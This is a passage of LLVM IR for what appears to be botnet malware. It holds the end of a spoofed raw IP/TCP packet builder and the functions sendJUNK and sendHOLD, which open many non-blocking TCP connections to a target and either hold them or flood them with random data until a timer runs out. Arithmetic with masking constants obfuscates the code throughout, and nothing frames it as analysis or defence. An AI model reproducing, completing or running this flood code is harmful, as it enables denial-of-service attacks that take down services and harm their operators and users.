  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 3
  store i16 %460, i16* %462, align 4
  %463 = call i32 @rand_cmwc()
  %464 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 0
  %466 = bitcast %union.anon.0* %465 to %struct.anon.1*
  %467 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %466, i32 0, i32 2
  store i32 %463, i32* %467, align 4
  %468 = call i32 @rand_cmwc()
  %469 = trunc i32 %468 to i16
  %470 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 0
  %472 = bitcast %union.anon.0* %471 to %struct.anon.1*
  %473 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %472, i32 0, i32 0
  store i16 %469, i16* %473, align 4
  %474 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 0
  %476 = bitcast %union.anon.0* %475 to %struct.anon.1*
  %477 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %476, i32 0, i32 6
  store i16 0, i16* %477, align 4
  %478 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %479 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %480 = call zeroext i16 @tcpcsum(%struct.iphdr* %478, %struct.tcphdr* %479)
  %481 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 0
  %483 = bitcast %union.anon.0* %482 to %struct.anon.1*
  %484 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %483, i32 0, i32 6
  store i16 %480, i16* %484, align 4
  %485 = bitcast i8* %97 to i16*
  %486 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 2
  %488 = load i16, i16* %487, align 2
  %489 = zext i16 %488 to i32
  %490 = call zeroext i16 @csum(i16* %485, i32 %489)
  %491 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 7
  store i16 %490, i16* %492, align 2
  %493 = load i32, i32* %25, align 4
  %494 = load i32, i32* %15, align 4
  %495 = icmp eq i32 %493, %494
  br i1 %495, label %496, label %502

; <label>:496:                                    ; preds = %450
  %497 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %498 = load i32, i32* %24, align 4
  %499 = icmp sgt i32 %497, %498
  br i1 %499, label %500, label %501

; <label>:500:                                    ; preds = %496
  br label %509

; <label>:501:                                    ; preds = %496
  store i32 0, i32* %25, align 4
  br label %449

; <label>:502:                                    ; preds = %450
  %503 = load i32, i32* %25, align 4
  %504 = sub i32 0, %503
  %505 = sub i32 0, 1
  %506 = add i32 %504, %505
  %507 = sub i32 0, %506
  %508 = add i32 %503, 1
  store i32 %507, i32* %25, align 4
  br label %449

; <label>:509:                                    ; preds = %500
  %510 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %510)
  br label %511

; <label>:511:                                    ; preds = %509, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %253

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = add i32 %45, 212446706
  %48 = add i32 %47, %46
  %49 = sub i32 %48, 212446706
  %50 = add nsw i32 %45, %46
  store i32 %49, i32* %17, align 4
  br label %51

; <label>:51:                                     ; preds = %250, %32
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %251

; <label>:55:                                     ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

; <label>:56:                                     ; preds = %244, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %250

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %243 [
    i32 0, label %67
    i32 1, label %126
    i32 2, label %217
  ]

; <label>:67:                                     ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = xor i32 %83, -1
  %85 = xor i32 2048, -1
  %86 = xor i32 1584352216, -1
  %87 = and i32 %84, 1584352216
  %88 = and i32 %83, %86
  %89 = and i32 %85, 1584352216
  %90 = and i32 2048, %86
  %91 = or i32 %87, %88
  %92 = or i32 %89, %90
  %93 = xor i32 %91, %92
  %94 = or i32 %84, %85
  %95 = xor i32 %94, -1
  %96 = or i32 1584352216, %86
  %97 = and i32 %95, %96
  %98 = or i32 %93, %97
  %99 = or i32 %83, 2048
  %100 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %98)
  %101 = load i32, i32* %8, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %102
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %103, i32 0, i32 0
  %105 = load i32, i32* %104, align 8
  %106 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %107 = call i32 @connect(i32 %105, %struct.sockaddr* %106, i32 16)
  %108 = icmp ne i32 %107, -1
  br i1 %108, label %113, label %109

; <label>:109:                                    ; preds = %67
  %110 = call i32* @__errno_location() #13
  %111 = load i32, i32* %110, align 4
  %112 = icmp ne i32 %111, 115
  br i1 %112, label %113, label %120

; <label>:113:                                    ; preds = %109, %67
  %114 = load i32, i32* %8, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 8
  %119 = call i32 @close(i32 %118)
  br label %125

; <label>:120:                                    ; preds = %109
  %121 = load i32, i32* %8, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %122
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %123, i32 0, i32 1
  store i8 1, i8* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %120, %113
  br label %243

; <label>:126:                                    ; preds = %60
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %129 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 0
  %130 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %129) #2, !srcloc !6
  %131 = extractvalue { i64, i64* } %130, 0
  %132 = extractvalue { i64, i64* } %130, 1
  %133 = trunc i64 %131 to i32
  store i32 %133, i32* %18, align 4
  %134 = ptrtoint i64* %132 to i64
  %135 = trunc i64 %134 to i32
  store i32 %135, i32* %19, align 4
  br label %136

; <label>:136:                                    ; preds = %127
  br label %137

; <label>:137:                                    ; preds = %136
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = srem i32 %142, 64
  %144 = zext i32 %143 to i64
  %145 = shl i64 1, %144
  %146 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %147 = load i32, i32* %8, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %148
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 8
  %152 = sdiv i32 %151, 64
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [16 x i64], [16 x i64]* %146, i64 0, i64 %153
  %155 = load i64, i64* %154, align 8
  %156 = and i64 %155, %145
  %157 = xor i64 %155, %145
  %158 = or i64 %156, %157
  %159 = or i64 %155, %145
  store i64 %158, i64* %154, align 8
  %160 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %160, align 8
  %161 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %161, align 8
  %162 = load i32, i32* %8, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %163
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %164, i32 0, i32 0
  %166 = load i32, i32* %165, align 8
  %167 = sub i32 %166, 1488251808
  %168 = add i32 %167, 1
  %169 = add i32 %168, 1488251808
  %170 = add nsw i32 %166, 1
  %171 = call i32 @select(i32 %169, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %171, i32* %15, align 4
  %172 = load i32, i32* %15, align 4
  %173 = icmp eq i32 %172, 1
  br i1 %173, label %174, label %201

; <label>:174:                                    ; preds = %137
  store i32 4, i32* %13, align 4
  %175 = load i32, i32* %8, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %176
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = bitcast i32* %14 to i8*
  %181 = call i32 @getsockopt(i32 %179, i32 1, i32 4, i8* %180, i32* %13) #2
  %182 = load i32, i32* %14, align 4
  %183 = icmp ne i32 %182, 0
  br i1 %183, label %184, label %195

; <label>:184:                                    ; preds = %174
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 8
  %190 = call i32 @close(i32 %189)
  %191 = load i32, i32* %8, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %192
  %194 = getelementptr inbounds %struct.state_t, %struct.state_t* %193, i32 0, i32 1
  store i8 0, i8* %194, align 4
  br label %200

; <label>:195:                                    ; preds = %174
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 1
  store i8 2, i8* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %195, %184
  br label %216

; <label>:201:                                    ; preds = %137
  %202 = load i32, i32* %15, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %215

; <label>:204:                                    ; preds = %201
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = call i32 @close(i32 %209)
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 1
  store i8 0, i8* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %204, %201
  br label %216

; <label>:216:                                    ; preds = %215, %200
  br label %243

; <label>:217:                                    ; preds = %60
  %218 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %218, i32 1024)
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = load i8*, i8** %16, align 8
  %225 = call i64 @send(i32 %223, i8* %224, i64 1024, i32 16384)
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %227, label %242

; <label>:227:                                    ; preds = %217
  %228 = call i32* @__errno_location() #13
  %229 = load i32, i32* %228, align 4
  %230 = icmp ne i32 %229, 11
  br i1 %230, label %231, label %242

; <label>:231:                                    ; preds = %227
  %232 = load i32, i32* %8, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %233
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = call i32 @close(i32 %236)
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 1
  store i8 0, i8* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %231, %227, %217
  br label %243

; <label>:243:                                    ; preds = %242, %216, %125, %60
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %8, align 4
  %246 = sub i32 %245, 585809491
  %247 = add i32 %246, 1
  %248 = add i32 %247, 585809491
  %249 = add nsw i32 %245, 1
  store i32 %248, i32* %8, align 4
  br label %56

; <label>:250:                                    ; preds = %56
  br label %51

; <label>:251:                                    ; preds = %51
  %252 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %252)
  br label %253

; <label>:253:                                    ; preds = %251, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %288

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 %47, %49
  %51 = add nsw i32 %47, %48
  store i32 %50, i32* %17, align 4
  br label %52

; <label>:52:                                     ; preds = %285, %34
  %53 = load i32, i32* %17, align 4
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = icmp sgt i32 %53, %54
  br i1 %55, label %56, label %286

; <label>:56:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %279, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %285

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %278 [
    i32 0, label %68
    i32 1, label %115
    i32 2, label %206
  ]

; <label>:68:                                     ; preds = %61
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null)
  %85 = and i32 %84, 2048
  %86 = xor i32 %84, 2048
  %87 = or i32 %85, %86
  %88 = or i32 %84, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %78, i32 4, i32 %87)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  br i1 %97, label %102, label %98

; <label>:98:                                     ; preds = %68
  %99 = call i32* @__errno_location() #13
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, 115
  br i1 %101, label %102, label %109

; <label>:102:                                    ; preds = %98, %68
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = call i32 @close(i32 %107)
  br label %114

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %8, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %111
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %112, i32 0, i32 1
  store i8 1, i8* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %109, %102
  br label %278

; <label>:115:                                    ; preds = %61
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %118 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 0
  %119 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %118) #2, !srcloc !7
  %120 = extractvalue { i64, i64* } %119, 0
  %121 = extractvalue { i64, i64* } %119, 1
  %122 = trunc i64 %120 to i32
  store i32 %122, i32* %18, align 4
  %123 = ptrtoint i64* %121 to i64
  %124 = trunc i64 %123 to i32
  store i32 %124, i32* %19, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = and i64 %144, %134
  %146 = xor i64 %144, %134
  %147 = or i64 %145, %146
  %148 = or i64 %144, %134
  store i64 %147, i64* %143, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %149, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %150, align 8
  %151 = load i32, i32* %8, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %152
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = add i32 %155, -1986429130
  %157 = add i32 %156, 1
  %158 = sub i32 %157, -1986429130
  %159 = add nsw i32 %155, 1
  %160 = call i32 @select(i32 %158, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %160, i32* %15, align 4
  %161 = load i32, i32* %15, align 4
  %162 = icmp eq i32 %161, 1
  br i1 %162, label %163, label %190

; <label>:163:                                    ; preds = %126
  store i32 4, i32* %13, align 4
  %164 = load i32, i32* %8, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %165
  %167 = getelementptr inbounds %struct.state_t, %struct.state_t* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 8
  %169 = bitcast i32* %14 to i8*
  %170 = call i32 @getsockopt(i32 %168, i32 1, i32 4, i8* %169, i32* %13) #2
  %171 = load i32, i32* %14, align 4
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %173, label %184

; <label>:173:                                    ; preds = %163
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  br label %189

; <label>:184:                                    ; preds = %163
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %184, %173
  br label %205

; <label>:190:                                    ; preds = %126
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %204

; <label>:193:                                    ; preds = %190
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 8
  %199 = call i32 @close(i32 %198)
  %200 = load i32, i32* %8, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %201
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %202, i32 0, i32 1
  store i8 0, i8* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %193, %190
  br label %205

; <label>:205:                                    ; preds = %204, %189
  br label %278

; <label>:206:                                    ; preds = %61
  br label %207

; <label>:207:                                    ; preds = %206
  %208 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %209 = getelementptr inbounds [16 x i64], [16 x i64]* %208, i64 0, i64 0
